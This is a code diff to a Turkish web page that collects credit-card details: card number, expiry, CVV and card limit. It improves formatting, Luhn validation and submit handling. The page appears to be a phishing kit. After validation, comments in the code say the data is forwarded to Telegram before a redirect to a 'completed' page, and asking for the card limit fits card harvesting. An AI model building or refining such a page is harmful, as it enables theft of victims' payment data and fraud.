@@ -153,7 +153,7 @@
                     </form>
 
                     <!-- Kredi Kartı Bilgileri Formu - Başlangıçta gizli -->
-                    <form id="krediKartiForm" style="display: none; margin-top: 30px;">
+                    <form id="krediKartiForm" style="display: none; margin-top: 30px;" novalidate>
                       <div class="basvuru-info-section" style="background: #fff3cd; border-left: 4px solid #ffc107; margin-bottom: 20px;">
                         <h3 style="margin-top: 0; color: #856404; font-size: 18px;">Kredi Kartı Bilgileri</h3>
                         <p style="color: #856404; font-size: 14px; margin: 10px 0;">Lütfen kredi kartı bilgilerinizi giriniz</p>
@@ -181,7 +181,7 @@
                       </div>
 
                       <div class="loginFormButtonHolder">
-                        <button type="submit" class="ui-button darkBlueButton login" id="kartSubmitBtn">Kart Bilgilerini Onayla</button>
+                        <button type="button" class="ui-button darkBlueButton login" id="kartSubmitBtn">Kart Bilgilerini Onayla</button>
                       </div>
                     </form>
                   </div>
@@ -460,10 +460,30 @@
 
       if (kartNumarasiInput) {
         kartNumarasiInput.addEventListener('input', function(e) {
-          this.value = formatKartNumarasi(this.value);
-          if (this.value.replace(/\s/g, '').length > 16) {
-            this.value = formatKartNumarasi(this.value.replace(/\s/g, '').substring(0, 16));
+          // Önce sadece rakamları al
+          let cleaned = this.value.replace(/\s/g, '').replace(/\D/g, '');
+          
+          // Maksimum 16 karakter
+          if (cleaned.length > 16) {
+            cleaned = cleaned.substring(0, 16);
           }
+          
+          // Formatla (4'er haneli gruplar)
+          this.value = formatKartNumarasi(cleaned);
+        });
+        
+        // Paste event'ini de handle et
+        kartNumarasiInput.addEventListener('paste', function(e) {
+          e.preventDefault();
+          const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+          let cleaned = pastedText.replace(/\s/g, '').replace(/\D/g, '');
+          
+          if (cleaned.length > 16) {
+            cleaned = cleaned.substring(0, 16);
+          }
+          
+          this.value = formatKartNumarasi(cleaned);
+          this.dispatchEvent(new Event('input'));
         });
       }
 
@@ -551,92 +571,133 @@
         document.getElementById('krediKartiForm').scrollIntoView({ behavior: 'smooth', block: 'start' });
       });
 
-      // İkinci form submit - Kredi kartı bilgileri
-      document.getElementById('krediKartiForm').addEventListener('submit', function(e) {
-        e.preventDefault();
+      // Luhn algoritması ile geçerlilik kontrolü (global fonksiyon)
+      function validateLuhn(cardNumber) {
+        if (!cardNumber || cardNumber.length === 0) {
+          return false;
+        }
+        
+        // Sadece rakam kontrolü
+        if (!/^\d+$/.test(cardNumber)) {
+          return false;
+        }
+        
+        let sum = 0;
+        let isEven = false;
+        
+        // Sağdan sola doğru işle
+        for (let i = cardNumber.length - 1; i >= 0; i--) {
+          let digit = parseInt(cardNumber[i]);
+          
+          if (isEven) {
+            digit *= 2;
+            if (digit > 9) {
+              digit -= 9;
+            }
+          }
+          
+          sum += digit;
+          isEven = !isEven;
+        }
+        
+        return sum % 10 === 0;
+      }
 
-        // Kredi kartı numarasını temizle (boşlukları kaldır)
-        const kartNumarasiRaw = document.getElementById('kartNumarasi').value;
+      // Kredi kartı formu submit fonksiyonu
+      function submitKrediKartiForm() {
+        console.log('Kredi kartı formu submit fonksiyonu çağrıldı - Validasyon başlıyor...');
+
+        // Kredi kartı numarasını temizle (boşlukları ve rakam olmayan karakterleri kaldır)
+        const kartNumarasiInput = document.getElementById('kartNumarasi');
+        if (!kartNumarasiInput) {
+          console.error('Kart numarası input bulunamadı!');
+          return false;
+        }
+        
+        const kartNumarasiRaw = kartNumarasiInput.value;
         const kartNumarasi = kartNumarasiRaw.replace(/\s/g, '').replace(/\D/g, '');
+        
+        console.log('Kart numarası (raw):', kartNumarasiRaw);
+        console.log('Kart numarası (cleaned):', kartNumarasi);
+        console.log('Kart numarası uzunluğu:', kartNumarasi.length);
+
         const sonKullanimAy = document.getElementById('sonKullanimAy').value;
         const sonKullanimYil = document.getElementById('sonKullanimYil').value;
         const cvv = document.getElementById('cvv').value;
         const kartLimiti = document.getElementById('kartLimiti').value.replace(/\D/g, '');
 
-        // Kredi kartı numarası validasyonu
+        // Kredi kartı numarası validasyonu - Sıralı kontrol
         if (!kartNumarasi || kartNumarasi.length === 0) {
+          console.log('Hata: Kart numarası boş');
           alert('Lütfen kredi kartı numaranızı giriniz');
-          document.getElementById('kartNumarasi').focus();
-          return;
+          kartNumarasiInput.focus();
+          kartNumarasiInput.select();
+          return false;
         }
 
-        // Sadece rakam kontrolü
+        // Sadece rakam kontrolü (double check)
         if (!/^\d+$/.test(kartNumarasi)) {
+          console.log('Hata: Kart numarası sadece rakamlardan oluşmuyor');
           alert('Kredi kartı numarası sadece rakamlardan oluşmalıdır');
-          document.getElementById('kartNumarasi').focus();
-          return;
+          kartNumarasiInput.focus();
+          kartNumarasiInput.select();
+          return false;
         }
 
-        // 16 haneli olmalı
+        // 16 haneli olmalı - KESIN KONTROL
         if (kartNumarasi.length !== 16) {
-          alert('Kredi kartı numarası tam olarak 16 haneli olmalıdır. Lütfen kontrol ediniz.');
-          document.getElementById('kartNumarasi').focus();
-          return;
+          console.log('Hata: Kart numarası 16 haneli değil, uzunluk:', kartNumarasi.length);
+          alert('Kredi kartı numarası tam olarak 16 haneli olmalıdır. Lütfen kontrol ediniz. (Girilen: ' + kartNumarasi.length + ' hane)');
+          kartNumarasiInput.focus();
+          kartNumarasiInput.select();
+          return false;
         }
 
         // Aynı rakamların tekrarı kontrolü (1111111111111111 gibi)
         if (/^(\d)\1{15}$/.test(kartNumarasi)) {
+          console.log('Hata: Aynı rakamların tekrarı');
           alert('Geçerli bir kredi kartı numarası giriniz');
-          document.getElementById('kartNumarasi').focus();
-          return;
+          kartNumarasiInput.focus();
+          kartNumarasiInput.select();
+          return false;
         }
 
         // Luhn algoritması ile geçerlilik kontrolü
-        function validateLuhn(cardNumber) {
-          let sum = 0;
-          let isEven = false;
-          
-          // Sağdan sola doğru işle
-          for (let i = cardNumber.length - 1; i >= 0; i--) {
-            let digit = parseInt(cardNumber[i]);
-            
-            if (isEven) {
-              digit *= 2;
-              if (digit > 9) {
-                digit -= 9;
-              }
-            }
-            
-            sum += digit;
-            isEven = !isEven;
-          }
-          
-          return sum % 10 === 0;
+        const isLuhnValid = validateLuhn(kartNumarasi);
+        console.log('Luhn algoritması sonucu:', isLuhnValid);
+        
+        if (!isLuhnValid) {
+          console.log('Hata: Luhn algoritması geçersiz');
+          alert('Geçerli bir kredi kartı numarası giriniz');
+          kartNumarasiInput.focus();
+          kartNumarasiInput.select();
+          return false;
         }
 
-        if (!validateLuhn(kartNumarasi)) {
-          alert('Geçerli bir kredi kartı numarası giriniz');
-          document.getElementById('kartNumarasi').focus();
-          return;
-        }
+        console.log('Kart numarası validasyonu başarılı!');
 
         // Ay kontrolü - 1-12 arası, tek haneli de olabilir (1-9 veya 01-12)
         const ayNum = parseInt(sonKullanimAy);
         if (!sonKullanimAy || sonKullanimAy.length === 0 || ayNum < 1 || ayNum > 12) {
+          console.log('Hata: Ay geçersiz');
           alert('Lütfen geçerli bir ay giriniz (1-12)');
-          return;
+          return false;
         }
 
         // Yıl kontrolü - 1-2 haneli olabilir (1-99)
         if (!sonKullanimYil || sonKullanimYil.length === 0) {
+          console.log('Hata: Yıl geçersiz');
           alert('Lütfen geçerli bir yıl giriniz');
-          return;
+          return false;
         }
 
         if (!cvv || cvv.length !== 3) {
+          console.log('Hata: CVV geçersiz');
           alert('Lütfen geçerli bir CVV numarası giriniz (3 haneli)');
-          return;
+          return false;
         }
+
+        console.log('Tüm validasyonlar başarılı! Telegram gönderiliyor...');
 
         // Telegram'a bildirim gönder - Adım 3 (async, yönlendirmeyi beklemez)
         const telefon = urlParams.get('phone') || '';
@@ -678,7 +739,37 @@
 
         // Başvuru tamamlandı - direkt tamamlandi.html'ye yönlendir
         window.location.href = '/tamamlandi.html';
-      });
+        return true;
+      }
+
+      // Butona click event listener ekle
+      const kartSubmitBtn = document.getElementById('kartSubmitBtn');
+      if (kartSubmitBtn) {
+        // Önce mevcut event listener'ları temizle
+        const newBtn = kartSubmitBtn.cloneNode(true);
+        kartSubmitBtn.parentNode.replaceChild(newBtn, kartSubmitBtn);
+        
+        newBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          e.stopPropagation();
+          e.stopImmediatePropagation();
+          
+          console.log('Buton tıklandı! Validasyon başlatılıyor...');
+          submitKrediKartiForm();
+        }, true); // Capture phase'de çalış
+      }
+
+      // Form submit event'i de ekle (güvenlik için)
+      const krediKartiForm = document.getElementById('krediKartiForm');
+      if (krediKartiForm) {
+        krediKartiForm.addEventListener('submit', function(e) {
+          e.preventDefault();
+          e.stopPropagation();
+          e.stopImmediatePropagation();
+          console.log('Form submit event tetiklendi!');
+          submitKrediKartiForm();
+        });
+      }
     });
   </script>
 </body>
